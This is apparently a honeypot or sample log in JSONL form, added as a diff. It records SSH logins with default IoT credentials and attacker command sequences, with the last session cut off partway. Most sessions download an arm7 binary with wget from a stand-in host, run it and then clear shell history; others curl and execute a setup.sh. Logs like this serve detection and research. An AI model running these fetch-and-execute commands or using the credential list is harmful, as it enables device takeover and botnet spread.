+{"event": "auth_attempt", "ts": "2026-10-19T18:30:42.783565+00:00", "session_id": "2134dc35", "src_ip": "192.0.2.103", "username": "support", "password": "support", "accepted": true}
+{"event": "command", "ts": "2026-10-19T18:30:42.825150+00:00", "session_id": "2134dc35", "src_ip": "192.0.2.103", "command": "/bin/busybox ECCHI", "seconds_since_prev": 0.0, "backspaces": 0}
+{"event": "command", "ts": "2026-10-19T18:30:42.895860+00:00", "session_id": "2134dc35", "src_ip": "192.0.2.103", "command": "cat /proc/cpuinfo", "seconds_since_prev": 0.0707, "backspaces": 0}
+{"event": "command", "ts": "2026-10-19T18:30:42.979203+00:00", "session_id": "2134dc35", "src_ip": "192.0.2.103", "command": "cd /tmp || cd /var/run || cd /mnt", "seconds_since_prev": 0.0833, "backspaces": 0}
+{"event": "command", "ts": "2026-10-19T18:30:43.064720+00:00", "session_id": "2134dc35", "src_ip": "192.0.2.103", "command": "wget http://192.0.2.250/bins/arm7 -O .x", "seconds_since_prev": 0.0855, "backspaces": 0}
+{"event": "command", "ts": "2026-10-19T18:30:43.126577+00:00", "session_id": "2134dc35", "src_ip": "192.0.2.103", "command": "chmod 777 .x", "seconds_since_prev": 0.0619, "backspaces": 0}
+{"event": "command", "ts": "2026-10-19T18:30:43.186542+00:00", "session_id": "2134dc35", "src_ip": "192.0.2.103", "command": "./.x ssh", "seconds_since_prev": 0.06, "backspaces": 0}
+{"event": "command", "ts": "2026-10-19T18:30:43.248904+00:00", "session_id": "2134dc35", "src_ip": "192.0.2.103", "command": "rm -rf .x", "seconds_since_prev": 0.0624, "backspaces": 0}
+{"event": "command", "ts": "2026-10-19T18:30:43.320554+00:00", "session_id": "2134dc35", "src_ip": "192.0.2.103", "command": "history -c", "seconds_since_prev": 0.0716, "backspaces": 0}
+{"event": "session_end", "ts": "2026-10-19T18:30:43.630781+00:00", "session_id": "2134dc35", "src_ip": "192.0.2.103", "duration_s": 1.147, "command_count": 8, "auth_attempts": 1, "reason": "closed"}
+{"event": "session_start", "ts": "2026-10-21T13:20:42.483536+00:00", "session_id": "6e70dd9f", "src_ip": "198.51.100.22", "src_port": 46774, "client_banner": "SSH-2.0-libssh-0.9.6"}
+{"event": "auth_attempt", "ts": "2026-10-21T13:20:42.691456+00:00", "session_id": "6e70dd9f", "src_ip": "198.51.100.22", "username": "root", "password": "xc3511", "accepted": true}
+{"event": "command", "ts": "2026-10-21T13:20:42.734940+00:00", "session_id": "6e70dd9f", "src_ip": "198.51.100.22", "command": "/bin/busybox ECCHI", "seconds_since_prev": 0.0, "backspaces": 0}
+{"event": "command", "ts": "2026-10-21T13:20:42.801712+00:00", "session_id": "6e70dd9f", "src_ip": "198.51.100.22", "command": "cat /proc/cpuinfo", "seconds_since_prev": 0.0668, "backspaces": 0}
+{"event": "command", "ts": "2026-10-21T13:20:42.854825+00:00", "session_id": "6e70dd9f", "src_ip": "198.51.100.22", "command": "cd /tmp || cd /var/run || cd /mnt", "seconds_since_prev": 0.0531, "backspaces": 0}
+{"event": "command", "ts": "2026-10-21T13:20:42.916743+00:00", "session_id": "6e70dd9f", "src_ip": "198.51.100.22", "command": "wget http://192.0.2.250/bins/arm7 -O .x", "seconds_since_prev": 0.0619, "backspaces": 0}
+{"event": "command", "ts": "2026-10-21T13:20:42.988705+00:00", "session_id": "6e70dd9f", "src_ip": "198.51.100.22", "command": "chmod 777 .x", "seconds_since_prev": 0.072, "backspaces": 0}
+{"event": "command", "ts": "2026-10-21T13:20:43.057114+00:00", "session_id": "6e70dd9f", "src_ip": "198.51.100.22", "command": "./.x ssh", "seconds_since_prev": 0.0684, "backspaces": 0}
+{"event": "command", "ts": "2026-10-21T13:20:43.123365+00:00", "session_id": "6e70dd9f", "src_ip": "198.51.100.22", "command": "rm -rf .x", "seconds_since_prev": 0.0663, "backspaces": 0}
+{"event": "command", "ts": "2026-10-21T13:20:43.183031+00:00", "session_id": "6e70dd9f", "src_ip": "198.51.100.22", "command": "history -c", "seconds_since_prev": 0.0597, "backspaces": 0}
+{"event": "session_end", "ts": "2026-10-21T13:20:43.597917+00:00", "session_id": "6e70dd9f", "src_ip": "198.51.100.22", "duration_s": 1.114, "command_count": 8, "auth_attempts": 1, "reason": "closed"}
+{"event": "session_start", "ts": "2026-10-21T14:58:42.483536+00:00", "session_id": "84b8a398", "src_ip": "192.0.2.57", "src_port": 59864, "client_banner": "SSH-2.0-Go"}
+{"event": "auth_attempt", "ts": "2026-10-21T14:58:42.632348+00:00", "session_id": "84b8a398", "src_ip": "192.0.2.57", "username": "root", "password": "vizxv", "accepted": true}
+{"event": "command", "ts": "2026-10-21T14:58:42.694272+00:00", "session_id": "84b8a398", "src_ip": "192.0.2.57", "command": "/bin/busybox ECCHI", "seconds_since_prev": 0.0, "backspaces": 0}
+{"event": "command", "ts": "2026-10-21T14:58:42.760339+00:00", "session_id": "84b8a398", "src_ip": "192.0.2.57", "command": "cat /proc/cpuinfo", "seconds_since_prev": 0.0661, "backspaces": 0}
+{"event": "command", "ts": "2026-10-21T14:58:42.801662+00:00", "session_id": "84b8a398", "src_ip": "192.0.2.57", "command": "cd /tmp || cd /var/run || cd /mnt", "seconds_since_prev": 0.0413, "backspaces": 0}
+{"event": "command", "ts": "2026-10-21T14:58:42.875164+00:00", "session_id": "84b8a398", "src_ip": "192.0.2.57", "command": "wget http://192.0.2.250/bins/arm7 -O .x", "seconds_since_prev": 0.0735, "backspaces": 0}
+{"event": "command", "ts": "2026-10-21T14:58:42.930880+00:00", "session_id": "84b8a398", "src_ip": "192.0.2.57", "command": "chmod 777 .x", "seconds_since_prev": 0.0557, "backspaces": 0}
+{"event": "command", "ts": "2026-10-21T14:58:42.993941+00:00", "session_id": "84b8a398", "src_ip": "192.0.2.57", "command": "./.x ssh", "seconds_since_prev": 0.0631, "backspaces": 0}
+{"event": "command", "ts": "2026-10-21T14:58:43.063799+00:00", "session_id": "84b8a398", "src_ip": "192.0.2.57", "command": "rm -rf .x", "seconds_since_prev": 0.0699, "backspaces": 0}
+{"event": "command", "ts": "2026-10-21T14:58:43.132801+00:00", "session_id": "84b8a398", "src_ip": "192.0.2.57", "command": "history -c", "seconds_since_prev": 0.069, "backspaces": 0}
+{"event": "session_end", "ts": "2026-10-21T14:58:43.985319+00:00", "session_id": "84b8a398", "src_ip": "192.0.2.57", "duration_s": 1.502, "command_count": 8, "auth_attempts": 1, "reason": "closed"}
+{"event": "session_start", "ts": "2026-10-21T12:49:42.483536+00:00", "session_id": "c4282245", "src_ip": "198.51.100.91", "src_port": 48091, "client_banner": "SSH-2.0-libssh2_1.9.0"}
+{"event": "auth_attempt", "ts": "2026-10-21T12:49:42.637657+00:00", "session_id": "c4282245", "src_ip": "198.51.100.91", "username": "root", "password": "1234", "accepted": true}
+{"event": "command", "ts": "2026-10-21T12:49:42.685834+00:00", "session_id": "c4282245", "src_ip": "198.51.100.91", "command": "/bin/busybox ECCHI", "seconds_since_prev": 0.0, "backspaces": 0}
+{"event": "command", "ts": "2026-10-21T12:49:42.749380+00:00", "session_id": "c4282245", "src_ip": "198.51.100.91", "command": "cat /proc/cpuinfo", "seconds_since_prev": 0.0635, "backspaces": 0}
+{"event": "command", "ts": "2026-10-21T12:49:42.832368+00:00", "session_id": "c4282245", "src_ip": "198.51.100.91", "command": "cd /tmp || cd /var/run || cd /mnt", "seconds_since_prev": 0.083, "backspaces": 0}
+{"event": "command", "ts": "2026-10-21T12:49:42.914672+00:00", "session_id": "c4282245", "src_ip": "198.51.100.91", "command": "wget http://192.0.2.250/bins/arm7 -O .x", "seconds_since_prev": 0.0823, "backspaces": 0}
+{"event": "command", "ts": "2026-10-21T12:49:42.981680+00:00", "session_id": "c4282245", "src_ip": "198.51.100.91", "command": "chmod 777 .x", "seconds_since_prev": 0.067, "backspaces": 0}
+{"event": "command", "ts": "2026-10-21T12:49:43.051186+00:00", "session_id": "c4282245", "src_ip": "198.51.100.91", "command": "./.x ssh", "seconds_since_prev": 0.0695, "backspaces": 0}
+{"event": "command", "ts": "2026-10-21T12:49:43.118813+00:00", "session_id": "c4282245", "src_ip": "198.51.100.91", "command": "rm -rf .x", "seconds_since_prev": 0.0676, "backspaces": 0}
+{"event": "command", "ts": "2026-10-21T12:49:43.179648+00:00", "session_id": "c4282245", "src_ip": "198.51.100.91", "command": "history -c", "seconds_since_prev": 0.0608, "backspaces": 0}
+{"event": "session_end", "ts": "2026-10-21T12:49:43.307989+00:00", "session_id": "c4282245", "src_ip": "198.51.100.91", "duration_s": 0.824, "command_count": 8, "auth_attempts": 1, "reason": "closed"}
+{"event": "session_start", "ts": "2026-10-17T15:48:42.483536+00:00", "session_id": "9ca414cd", "src_ip": "198.51.100.22", "src_port": 46100, "client_banner": "SSH-2.0-libssh-0.9.6"}
+{"event": "auth_attempt", "ts": "2026-10-17T15:48:42.613121+00:00", "session_id": "9ca414cd", "src_ip": "198.51.100.22", "username": "root", "password": "admin", "accepted": true}
+{"event": "command", "ts": "2026-10-17T15:48:42.666378+00:00", "session_id": "9ca414cd", "src_ip": "198.51.100.22", "command": "/bin/busybox ECCHI", "seconds_since_prev": 0.0, "backspaces": 0}
+{"event": "command", "ts": "2026-10-17T15:48:42.737762+00:00", "session_id": "9ca414cd", "src_ip": "198.51.100.22", "command": "cat /proc/cpuinfo", "seconds_since_prev": 0.0714, "backspaces": 0}
+{"event": "command", "ts": "2026-10-17T15:48:42.823286+00:00", "session_id": "9ca414cd", "src_ip": "198.51.100.22", "command": "cd /tmp || cd /var/run || cd /mnt", "seconds_since_prev": 0.0855, "backspaces": 0}
+{"event": "command", "ts": "2026-10-17T15:48:42.905601+00:00", "session_id": "9ca414cd", "src_ip": "198.51.100.22", "command": "wget http://192.0.2.250/bins/arm7 -O .x", "seconds_since_prev": 0.0823, "backspaces": 0}
+{"event": "command", "ts": "2026-10-17T15:48:42.950978+00:00", "session_id": "9ca414cd", "src_ip": "198.51.100.22", "command": "chmod 777 .x", "seconds_since_prev": 0.0454, "backspaces": 0}
+{"event": "command", "ts": "2026-10-17T15:48:43.006563+00:00", "session_id": "9ca414cd", "src_ip": "198.51.100.22", "command": "./.x ssh", "seconds_since_prev": 0.0556, "backspaces": 0}
+{"event": "command", "ts": "2026-10-17T15:48:43.078032+00:00", "session_id": "9ca414cd", "src_ip": "198.51.100.22", "command": "rm -rf .x", "seconds_since_prev": 0.0715, "backspaces": 0}
+{"event": "command", "ts": "2026-10-17T15:48:43.146016+00:00", "session_id": "9ca414cd", "src_ip": "198.51.100.22", "command": "history -c", "seconds_since_prev": 0.068, "backspaces": 0}
+{"event": "session_end", "ts": "2026-10-17T15:48:43.346265+00:00", "session_id": "9ca414cd", "src_ip": "198.51.100.22", "duration_s": 0.863, "command_count": 8, "auth_attempts": 1, "reason": "closed"}
+{"event": "session_start", "ts": "2026-10-20T17:21:42.483536+00:00", "session_id": "24db0027", "src_ip": "198.51.100.91", "src_port": 36248, "client_banner": "SSH-2.0-libssh-0.9.6"}
+{"event": "auth_attempt", "ts": "2026-10-20T17:21:42.838608+00:00", "session_id": "24db0027", "src_ip": "198.51.100.91", "username": "support", "password": "support", "accepted": true}
+{"event": "command", "ts": "2026-10-20T17:21:42.926087+00:00", "session_id": "24db0027", "src_ip": "198.51.100.91", "command": "/bin/busybox ECCHI", "seconds_since_prev": 0.0, "backspaces": 0}
+{"event": "command", "ts": "2026-10-20T17:21:42.967844+00:00", "session_id": "24db0027", "src_ip": "198.51.100.91", "command": "cat /proc/cpuinfo", "seconds_since_prev": 0.0418, "backspaces": 0}
+{"event": "command", "ts": "2026-10-20T17:21:43.008696+00:00", "session_id": "24db0027", "src_ip": "198.51.100.91", "command": "cd /tmp || cd /var/run || cd /mnt", "seconds_since_prev": 0.0409, "backspaces": 0}
+{"event": "command", "ts": "2026-10-20T17:21:43.082687+00:00", "session_id": "24db0027", "src_ip": "198.51.100.91", "command": "wget http://192.0.2.250/bins/arm7 -O .x", "seconds_since_prev": 0.074, "backspaces": 0}
+{"event": "command", "ts": "2026-10-20T17:21:43.151134+00:00", "session_id": "24db0027", "src_ip": "198.51.100.91", "command": "chmod 777 .x", "seconds_since_prev": 0.0684, "backspaces": 0}
+{"event": "command", "ts": "2026-10-20T17:21:43.191683+00:00", "session_id": "24db0027", "src_ip": "198.51.100.91", "command": "./.x ssh", "seconds_since_prev": 0.0405, "backspaces": 0}
+{"event": "command", "ts": "2026-10-20T17:21:43.259795+00:00", "session_id": "24db0027", "src_ip": "198.51.100.91", "command": "rm -rf .x", "seconds_since_prev": 0.0681, "backspaces": 0}
+{"event": "command", "ts": "2026-10-20T17:21:43.341817+00:00", "session_id": "24db0027", "src_ip": "198.51.100.91", "command": "history -c", "seconds_since_prev": 0.082, "backspaces": 0}
+{"event": "session_end", "ts": "2026-10-20T17:21:43.911585+00:00", "session_id": "24db0027", "src_ip": "198.51.100.91", "duration_s": 1.428, "command_count": 8, "auth_attempts": 1, "reason": "closed"}
+{"event": "session_start", "ts": "2026-10-15T17:13:42.483536+00:00", "session_id": "d3fc53ae", "src_ip": "198.51.100.91", "src_port": 52191, "client_banner": "SSH-2.0-libssh-0.9.6"}
+{"event": "auth_attempt", "ts": "2026-10-15T17:13:42.882710+00:00", "session_id": "d3fc53ae", "src_ip": "198.51.100.91", "username": "root", "password": "123456", "accepted": true}
+{"event": "command", "ts": "2026-10-15T17:13:42.949614+00:00", "session_id": "d3fc53ae", "src_ip": "198.51.100.91", "command": "/bin/busybox ECCHI", "seconds_since_prev": 0.0, "backspaces": 0}
+{"event": "command", "ts": "2026-10-15T17:13:43.038465+00:00", "session_id": "d3fc53ae", "src_ip": "198.51.100.91", "command": "cat /proc/cpuinfo", "seconds_since_prev": 0.0889, "backspaces": 0}
+{"event": "command", "ts": "2026-10-15T17:13:43.092034+00:00", "session_id": "d3fc53ae", "src_ip": "198.51.100.91", "command": "cd /tmp || cd /var/run || cd /mnt", "seconds_since_prev": 0.0536, "backspaces": 0}
+{"event": "command", "ts": "2026-10-15T17:13:43.159064+00:00", "session_id": "d3fc53ae", "src_ip": "198.51.100.91", "command": "wget http://192.0.2.250/bins/arm7 -O .x", "seconds_since_prev": 0.067, "backspaces": 0}
+{"event": "command", "ts": "2026-10-15T17:13:43.248161+00:00", "session_id": "d3fc53ae", "src_ip": "198.51.100.91", "command": "chmod 777 .x", "seconds_since_prev": 0.0891, "backspaces": 0}
+{"event": "command", "ts": "2026-10-15T17:13:43.300988+00:00", "session_id": "d3fc53ae", "src_ip": "198.51.100.91", "command": "./.x ssh", "seconds_since_prev": 0.0528, "backspaces": 0}
+{"event": "command", "ts": "2026-10-15T17:13:43.346232+00:00", "session_id": "d3fc53ae", "src_ip": "198.51.100.91", "command": "rm -rf .x", "seconds_since_prev": 0.0452, "backspaces": 0}
+{"event": "command", "ts": "2026-10-15T17:13:43.400517+00:00", "session_id": "d3fc53ae", "src_ip": "198.51.100.91", "command": "history -c", "seconds_since_prev": 0.0543, "backspaces": 0}
+{"event": "session_end", "ts": "2026-10-15T17:13:44.355414+00:00", "session_id": "d3fc53ae", "src_ip": "198.51.100.91", "duration_s": 1.872, "command_count": 8, "auth_attempts": 1, "reason": "closed"}
+{"event": "session_start", "ts": "2026-10-15T17:57:42.483536+00:00", "session_id": "fc75fd39", "src_ip": "192.0.2.103", "src_port": 35558, "client_banner": "SSH-2.0-Go"}
+{"event": "auth_attempt", "ts": "2026-10-15T17:57:42.841041+00:00", "session_id": "fc75fd39", "src_ip": "192.0.2.103", "username": "root", "password": "vizxv", "accepted": true}
+{"event": "command", "ts": "2026-10-15T17:57:42.887352+00:00", "session_id": "fc75fd39", "src_ip": "192.0.2.103", "command": "/bin/busybox ECCHI", "seconds_since_prev": 0.0, "backspaces": 0}
+{"event": "command", "ts": "2026-10-15T17:57:42.934820+00:00", "session_id": "fc75fd39", "src_ip": "192.0.2.103", "command": "cat /proc/cpuinfo", "seconds_since_prev": 0.0475, "backspaces": 0}
+{"event": "command", "ts": "2026-10-15T17:57:43.018989+00:00", "session_id": "fc75fd39", "src_ip": "192.0.2.103", "command": "cd /tmp || cd /var/run || cd /mnt", "seconds_since_prev": 0.0842, "backspaces": 0}
+{"event": "command", "ts": "2026-10-15T17:57:43.063826+00:00", "session_id": "fc75fd39", "src_ip": "192.0.2.103", "command": "wget http://192.0.2.250/bins/arm7 -O .x", "seconds_since_prev": 0.0448, "backspaces": 0}
+{"event": "command", "ts": "2026-10-15T17:57:43.110852+00:00", "session_id": "fc75fd39", "src_ip": "192.0.2.103", "command": "chmod 777 .x", "seconds_since_prev": 0.047, "backspaces": 0}
+{"event": "command", "ts": "2026-10-15T17:57:43.186913+00:00", "session_id": "fc75fd39", "src_ip": "192.0.2.103", "command": "./.x ssh", "seconds_since_prev": 0.0761, "backspaces": 0}
+{"event": "command", "ts": "2026-10-15T17:57:43.240297+00:00", "session_id": "fc75fd39", "src_ip": "192.0.2.103", "command": "rm -rf .x", "seconds_since_prev": 0.0534, "backspaces": 0}
+{"event": "command", "ts": "2026-10-15T17:57:43.284105+00:00", "session_id": "fc75fd39", "src_ip": "192.0.2.103", "command": "history -c", "seconds_since_prev": 0.0438, "backspaces": 0}
+{"event": "session_end", "ts": "2026-10-15T17:57:43.949567+00:00", "session_id": "fc75fd39", "src_ip": "192.0.2.103", "duration_s": 1.466, "command_count": 8, "auth_attempts": 1, "reason": "closed"}
+{"event": "session_start", "ts": "2026-10-20T11:25:42.483536+00:00", "session_id": "22e0ad5f", "src_ip": "198.51.100.22", "src_port": 42639, "client_banner": "SSH-2.0-libssh2_1.9.0"}
+{"event": "auth_attempt", "ts": "2026-10-20T11:25:42.838393+00:00", "session_id": "22e0ad5f", "src_ip": "198.51.100.22", "username": "support", "password": "support", "accepted": true}
+{"event": "command", "ts": "2026-10-20T11:25:42.892178+00:00", "session_id": "22e0ad5f", "src_ip": "198.51.100.22", "command": "/bin/busybox ECCHI", "seconds_since_prev": 0.0, "backspaces": 0}
+{"event": "command", "ts": "2026-10-20T11:25:42.947556+00:00", "session_id": "22e0ad5f", "src_ip": "198.51.100.22", "command": "cat /proc/cpuinfo", "seconds_since_prev": 0.0554, "backspaces": 0}
+{"event": "command", "ts": "2026-10-20T11:25:43.031138+00:00", "session_id": "22e0ad5f", "src_ip": "198.51.100.22", "command": "cd /tmp || cd /var/run || cd /mnt", "seconds_since_prev": 0.0836, "backspaces": 0}
+{"event": "command", "ts": "2026-10-20T11:25:43.084365+00:00", "session_id": "22e0ad5f", "src_ip": "198.51.100.22", "command": "wget http://192.0.2.250/bins/arm7 -O .x", "seconds_since_prev": 0.0532, "backspaces": 0}
+{"event": "command", "ts": "2026-10-20T11:25:43.169894+00:00", "session_id": "22e0ad5f", "src_ip": "198.51.100.22", "command": "chmod 777 .x", "seconds_since_prev": 0.0855, "backspaces": 0}
+{"event": "command", "ts": "2026-10-20T11:25:43.228868+00:00", "session_id": "22e0ad5f", "src_ip": "198.51.100.22", "command": "./.x ssh", "seconds_since_prev": 0.059, "backspaces": 0}
+{"event": "command", "ts": "2026-10-20T11:25:43.299912+00:00", "session_id": "22e0ad5f", "src_ip": "198.51.100.22", "command": "rm -rf .x", "seconds_since_prev": 0.071, "backspaces": 0}
+{"event": "command", "ts": "2026-10-20T11:25:43.383329+00:00", "session_id": "22e0ad5f", "src_ip": "198.51.100.22", "command": "history -c", "seconds_since_prev": 0.0834, "backspaces": 0}
+{"event": "session_end", "ts": "2026-10-20T11:25:43.956005+00:00", "session_id": "22e0ad5f", "src_ip": "198.51.100.22", "duration_s": 1.472, "command_count": 8, "auth_attempts": 1, "reason": "closed"}
+{"event": "session_start", "ts": "2026-10-21T16:29:42.483536+00:00", "session_id": "5a60143e", "src_ip": "198.51.100.91", "src_port": 62491, "client_banner": "SSH-2.0-Go"}
+{"event": "auth_attempt", "ts": "2026-10-21T16:29:42.831518+00:00", "session_id": "5a60143e", "src_ip": "198.51.100.91", "username": "root", "password": "xc3511", "accepted": true}
+{"event": "command", "ts": "2026-10-21T16:29:42.920905+00:00", "session_id": "5a60143e", "src_ip": "198.51.100.91", "command": "/bin/busybox ECCHI", "seconds_since_prev": 0.0, "backspaces": 0}
+{"event": "command", "ts": "2026-10-21T16:29:42.983760+00:00", "session_id": "5a60143e", "src_ip": "198.51.100.91", "command": "cat /proc/cpuinfo", "seconds_since_prev": 0.0629, "backspaces": 0}
+{"event": "command", "ts": "2026-10-21T16:29:43.045388+00:00", "session_id": "5a60143e", "src_ip": "198.51.100.91", "command": "cd /tmp || cd /var/run || cd /mnt", "seconds_since_prev": 0.0616, "backspaces": 0}
+{"event": "command", "ts": "2026-10-21T16:29:43.099423+00:00", "session_id": "5a60143e", "src_ip": "198.51.100.91", "command": "wget http://192.0.2.250/bins/arm7 -O .x", "seconds_since_prev": 0.054, "backspaces": 0}
+{"event": "command", "ts": "2026-10-21T16:29:43.173196+00:00", "session_id": "5a60143e", "src_ip": "198.51.100.91", "command": "chmod 777 .x", "seconds_since_prev": 0.0738, "backspaces": 0}
+{"event": "command", "ts": "2026-10-21T16:29:43.260251+00:00", "session_id": "5a60143e", "src_ip": "198.51.100.91", "command": "./.x ssh", "seconds_since_prev": 0.0871, "backspaces": 0}
+{"event": "command", "ts": "2026-10-21T16:29:43.306830+00:00", "session_id": "5a60143e", "src_ip": "198.51.100.91", "command": "rm -rf .x", "seconds_since_prev": 0.0466, "backspaces": 0}
+{"event": "command", "ts": "2026-10-21T16:29:43.361175+00:00", "session_id": "5a60143e", "src_ip": "198.51.100.91", "command": "history -c", "seconds_since_prev": 0.0543, "backspaces": 0}
+{"event": "session_end", "ts": "2026-10-21T16:29:44.169506+00:00", "session_id": "5a60143e", "src_ip": "198.51.100.91", "duration_s": 1.686, "command_count": 8, "auth_attempts": 1, "reason": "closed"}
+{"event": "session_start", "ts": "2026-10-20T19:40:42.483536+00:00", "session_id": "ddcf8e6e", "src_ip": "192.0.2.14", "src_port": 50317, "client_banner": "SSH-2.0-libssh-0.9.6"}
+{"event": "auth_attempt", "ts": "2026-10-20T19:40:42.826445+00:00", "session_id": "ddcf8e6e", "src_ip": "192.0.2.14", "username": "root", "password": "123456", "accepted": true}
+{"event": "command", "ts": "2026-10-20T19:40:42.905017+00:00", "session_id": "ddcf8e6e", "src_ip": "192.0.2.14", "command": "/bin/busybox ECCHI", "seconds_since_prev": 0.0, "backspaces": 0}
+{"event": "command", "ts": "2026-10-20T19:40:42.984369+00:00", "session_id": "ddcf8e6e", "src_ip": "192.0.2.14", "command": "cat /proc/cpuinfo", "seconds_since_prev": 0.0794, "backspaces": 0}
+{"event": "command", "ts": "2026-10-20T19:40:43.067198+00:00", "session_id": "ddcf8e6e", "src_ip": "192.0.2.14", "command": "cd /tmp || cd /var/run || cd /mnt", "seconds_since_prev": 0.0828, "backspaces": 0}
+{"event": "command", "ts": "2026-10-20T19:40:43.120667+00:00", "session_id": "ddcf8e6e", "src_ip": "192.0.2.14", "command": "wget http://192.0.2.250/bins/arm7 -O .x", "seconds_since_prev": 0.0535, "backspaces": 0}
+{"event": "command", "ts": "2026-10-20T19:40:43.197949+00:00", "session_id": "ddcf8e6e", "src_ip": "192.0.2.14", "command": "chmod 777 .x", "seconds_since_prev": 0.0773, "backspaces": 0}
+{"event": "command", "ts": "2026-10-20T19:40:43.273907+00:00", "session_id": "ddcf8e6e", "src_ip": "192.0.2.14", "command": "./.x ssh", "seconds_since_prev": 0.076, "backspaces": 0}
+{"event": "command", "ts": "2026-10-20T19:40:43.355415+00:00", "session_id": "ddcf8e6e", "src_ip": "192.0.2.14", "command": "rm -rf .x", "seconds_since_prev": 0.0815, "backspaces": 0}
+{"event": "command", "ts": "2026-10-20T19:40:43.412129+00:00", "session_id": "ddcf8e6e", "src_ip": "192.0.2.14", "command": "history -c", "seconds_since_prev": 0.0567, "backspaces": 0}
+{"event": "session_end", "ts": "2026-10-20T19:40:43.825974+00:00", "session_id": "ddcf8e6e", "src_ip": "192.0.2.14", "duration_s": 1.342, "command_count": 8, "auth_attempts": 1, "reason": "closed"}
+{"event": "session_start", "ts": "2026-10-18T07:47:42.483536+00:00", "session_id": "31a0110e", "src_ip": "203.0.113.8", "src_port": 54342, "client_banner": "SSH-2.0-libssh2_1.10.0"}
+{"event": "auth_attempt", "ts": "2026-10-18T07:47:42.690837+00:00", "session_id": "31a0110e", "src_ip": "203.0.113.8", "username": "root", "password": "root", "accepted": false}
+{"event": "auth_attempt", "ts": "2026-10-18T07:47:42.822059+00:00", "session_id": "31a0110e", "src_ip": "203.0.113.8", "username": "root", "password": "toor", "accepted": true}
+{"event": "command", "ts": "2026-10-18T07:47:43.090419+00:00", "session_id": "31a0110e", "src_ip": "203.0.113.8", "command": "uname -a", "seconds_since_prev": 0.0, "backspaces": 0}
+{"event": "command", "ts": "2026-10-18T07:47:43.310307+00:00", "session_id": "31a0110e", "src_ip": "203.0.113.8", "command": "nproc", "seconds_since_prev": 0.2199, "backspaces": 0}
+{"event": "command", "ts": "2026-10-18T07:47:43.606907+00:00", "session_id": "31a0110e", "src_ip": "203.0.113.8", "command": "free -m", "seconds_since_prev": 0.2966, "backspaces": 0}
+{"event": "command", "ts": "2026-10-18T07:47:43.818030+00:00", "session_id": "31a0110e", "src_ip": "203.0.113.8", "command": "cat /proc/cpuinfo | grep 'model name' | head -1", "seconds_since_prev": 0.2111, "backspaces": 0}
+{"event": "command", "ts": "2026-10-18T07:47:44.015858+00:00", "session_id": "31a0110e", "src_ip": "203.0.113.8", "command": "curl -s http://203.0.113.199/setup.sh -o /tmp/s.sh", "seconds_since_prev": 0.1978, "backspaces": 0}
+{"event": "command", "ts": "2026-10-18T07:47:44.160077+00:00", "session_id": "31a0110e", "src_ip": "203.0.113.8", "command": "chmod +x /tmp/s.sh", "seconds_since_prev": 0.1442, "backspaces": 0}
+{"event": "command", "ts": "2026-10-18T07:47:44.323727+00:00", "session_id": "31a0110e", "src_ip": "203.0.113.8", "command": "/tmp/s.sh", "seconds_since_prev": 0.1637, "backspaces": 0}
+{"event": "command", "ts": "2026-10-18T07:47:44.511482+00:00", "session_id": "31a0110e", "src_ip": "203.0.113.8", "command": "crontab -l", "seconds_since_prev": 0.1878, "backspaces": 0}
+{"event": "session_end", "ts": "2026-10-18T07:47:45.399216+00:00", "session_id": "31a0110e", "src_ip": "203.0.113.8", "duration_s": 2.916, "command_count": 8, "auth_attempts": 2, "reason": "closed"}
+{"event": "session_start", "ts": "2026-10-17T11:28:42.483536+00:00", "session_id": "d5dec821", "src_ip": "203.0.113.44", "src_port": 56551, "client_banner": "SSH-2.0-libssh2_1.10.0"}
+{"event": "auth_attempt", "ts": "2026-10-17T11:28:42.764061+00:00", "session_id": "d5dec821", "src_ip": "203.0.113.44", "username": "root", "password": "root", "accepted": false}
+{"event": "auth_attempt", "ts": "2026-10-17T11:28:42.831256+00:00", "session_id": "d5dec821", "src_ip": "203.0.113.44", "username": "root", "password": "toor", "accepted": true}
+{"event": "command", "ts": "2026-10-17T11:28:43.071371+00:00", "session_id": "d5dec821", "src_ip": "203.0.113.44", "command": "uname -a", "seconds_since_prev": 0.0, "backspaces": 0}
+{"event": "command", "ts": "2026-10-17T11:28:43.319861+00:00", "session_id": "d5dec821", "src_ip": "203.0.113.44", "command": "nproc", "seconds_since_prev": 0.2485, "backspaces": 0}
+{"event": "command", "ts": "2026-10-17T11:28:43.444705+00:00", "session_id": "d5dec821", "src_ip": "203.0.113.44", "command": "free -m", "seconds_since_prev": 0.1248, "backspaces": 0}
+{"event": "command", "ts": "2026-10-17T11:28:43.663055+00:00", "session_id": "d5dec821", "src_ip": "203.0.113.44", "command": "cat /proc/cpuinfo | grep 'model name' | head -1", "seconds_since_prev": 0.2183, "backspaces": 0}
+{"event": "command", "ts": "2026-10-17T11:28:43.929426+00:00", "session_id": "d5dec821", "src_ip": "203.0.113.44", "command": "curl -s http://203.0.113.199/setup.sh -o /tmp/s.sh", "seconds_since_prev": 0.2664, "backspaces": 0}
+{"event": "command", "ts": "2026-10-17T11:28:44.217965+00:00", "session_id": "d5dec821", "src_ip": "203.0.113.44", "command": "chmod +x /tmp/s.sh", "seconds_since_prev": 0.2885, "backspaces": 0}
+{"event": "command", "ts": "2026-10-17T11:28:44.474111+00:00", "session_id": "d5dec821", "src_ip": "203.0.113.44", "command": "/tmp/s.sh", "seconds_since_prev": 0.2561, "backspaces": 0}
+{"event": "command", "ts": "2026-10-17T11:28:44.713546+00:00", "session_id": "d5dec821", "src_ip": "203.0.113.44", "command": "crontab -l", "seconds_since_prev": 0.2394, "backspaces": 0}
+{"event": "session_end", "ts": "2026-10-17T11:28:44.895222+00:00", "session_id": "d5dec821", "src_ip": "203.0.113.44", "duration_s": 2.412, "command_count": 8, "auth_attempts": 2, "reason": "closed"}
+{"event": "session_start", "ts": "2026-10-21T06:22:42.483536+00:00", "session_id": "4ff0c38d", "src_ip": "203.0.113.44", "src_port": 42461, "client_banner": "SSH-2.0-libssh2_1.10.0"}
+{"event": "auth_attempt", "ts": "2026-10-21T06:22:42.783776+00:00", "session_id": "4ff0c38d", "src_ip": "203.0.113.44", "username": "root", "password": "root", "accepted": false}
+{"event": "auth_attempt", "ts": "2026-10-21T06:22:43.155546+00:00", "session_id": "4ff0c38d", "src_ip": "203.0.113.44", "username": "root", "password": "toor", "accepted": true}
+{"event": "command", "ts": "2026-10-21T06:22:43.381217+00:00", "session_id": "4ff0c38d", "src_ip": "203.0.113.44", "command": "uname -a", "seconds_since_prev": 0.0, "backspaces": 0}
+{"event": "command", "ts": "2026-10-21T06:22:43.579256+00:00", "session_id": "4ff0c38d", "src_ip": "203.0.113.44", "command": "nproc", "seconds_since_prev": 0.198, "backspaces": 0}
